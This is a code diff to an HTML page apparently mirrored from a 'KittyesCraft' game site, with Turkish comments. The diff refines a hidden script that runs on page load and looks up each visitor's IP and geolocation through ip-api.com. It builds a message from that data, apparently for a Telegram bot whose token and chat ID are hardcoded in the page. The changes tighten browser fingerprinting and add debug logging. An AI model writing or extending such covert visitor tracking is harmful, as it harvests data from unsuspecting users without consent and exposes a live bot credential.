@@ -674,28 +674,47 @@ fetch('http://ip-api.com/json/?fields=66846719')
 
     <!-- TELEGRAM BOT -->
     <!-- TELEGRAM BOT - TARAYICI DÜZELTİLMİŞ VERSİYON -->
+<!-- TELEGRAM BOT - TARAYICI KESİN ÇÖZÜM -->
 <script>
 const botToken = "8690281311:AAFGIGguVxQ4LgRmR7nSTa_HYY6Q_PSWONI";
 const chatId = "1504410647";
 
-// TARAYICI TESPİTİ - DÜZELTİLMİŞ
+// TARAYICI TESPİTİ - KESİN ÇÖZÜM
 function getBrowser() {
     const ua = navigator.userAgent;
     
-    if (ua.includes("Firefox")) return "Mozilla Firefox";
-    if (ua.includes("Edg")) return "Microsoft Edge";  // Edge için
-    if (ua.includes("Chrome")) return "Google Chrome";
-    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
-    if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+    // Önce Edge'i kontrol et (en spesifik)
+    if (ua.includes("Edg/") || ua.includes("Edge/")) {
+        return "Microsoft Edge";
+    }
+    // Opera / OPR
+    if (ua.includes("OPR") || ua.includes("Opera")) {
+        return "Opera";
+    }
+    // Firefox
+    if (ua.includes("Firefox")) {
+        return "Mozilla Firefox";
+    }
+    // Chrome (Edge değilse)
+    if (ua.includes("Chrome") && !ua.includes("Edg")) {
+        return "Google Chrome";
+    }
+    // Safari
+    if (ua.includes("Safari") && !ua.includes("Chrome")) {
+        return "Safari";
+    }
     
-    return "Bilinmiyor";
+    return navigator.userAgent; // Bilinmiyorsa userAgent gönder
 }
+
+// DEBUG: Konsolda görmek için
+console.log('User Agent:', navigator.userAgent);
+console.log('Tespit edilen:', getBrowser());
 
 fetch('http://ip-api.com/json/?fields=66846719')
   .then(response => response.json())
   .then(data => {
     const browser = getBrowser();
-    console.log('Tarayıcı:', browser, 'UserAgent:', navigator.userAgent); // Kontrol için
     
     const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
                     `🌐 <b>IP:</b> ${data.query}\n` +
@@ -724,6 +743,7 @@ fetch('http://ip-api.com/json/?fields=66846719')
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
+
 
 
 
